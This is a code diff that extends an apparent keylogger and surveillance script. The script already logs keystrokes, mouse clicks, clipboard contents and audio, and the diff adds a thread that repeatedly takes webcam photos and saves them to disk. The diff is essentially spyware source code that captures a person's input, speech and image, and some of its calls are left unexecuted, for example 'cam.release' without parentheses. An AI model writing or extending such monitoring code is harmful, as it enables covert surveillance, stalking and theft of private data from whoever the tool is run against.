@@ -12,6 +12,8 @@ import re
 import uuid
 import psutil
 import os
+import cv2
+import pathlib
 
 from pynput import keyboard, mouse
 from pynput.keyboard import Key
@@ -74,6 +76,25 @@ def start_audio_recording():
         logging.error(f"Error occurred while recording audio: {e}")
     finally:
         audio.terminate()
+
+def webcam():
+    try:
+        while stop_audio_thread.is_set():
+            pathlib.Path('WebcamPics').mkdir(parents=True, exist_ok=True)
+            cam_path = 'WebcamPics\\'
+            cam = cv2.VideoCapture(0)
+
+            for x in range(0, 10):
+                ret, img = cam.read()
+                file = (cam_path  + '{}.jpg'.format(x))
+                cv2.imwrite(file, img)
+                time.sleep(10)
+
+            cam.release                                     # Closes video file or capturing device
+            cv2.destroyAllWindows
+
+    except Exception as e:
+        print("WebcamPics could not be saved :" + str(e))
 
 def clipboard():
     previous_clipboard_data = ""  # Store the previous clipboard content
@@ -138,12 +159,15 @@ def main():
         setup_logging()
         log_system_info()
 
+
         clipboard_thread = threading.Thread(target=clipboard)
+        webcam_thread = threading.Thread(target=webcam)
         audio_thread = threading.Thread(target=start_audio_recording)
 
         # Start threads
         clipboard_thread.start()
         audio_thread.start()
+        webcam_thread.start()
 
         with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
             print("Script started. Press 'Esc' to stop.")
